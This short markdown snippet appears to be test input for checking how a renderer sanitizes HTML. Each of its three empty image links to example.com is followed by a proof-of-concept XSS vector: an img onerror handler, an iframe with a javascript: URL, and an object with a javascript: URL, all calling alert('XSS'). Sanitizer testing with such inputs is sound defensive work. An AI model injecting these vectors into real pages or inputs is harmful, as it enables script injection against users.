![](https://example.com
<img src=x onerror=alert('XSS')>
)

![](https://example.com)
<iframe src="javascript:alert('XSS')"></iframe>

![](https://example.com)
<object data="javascript:alert('XSS')"></object>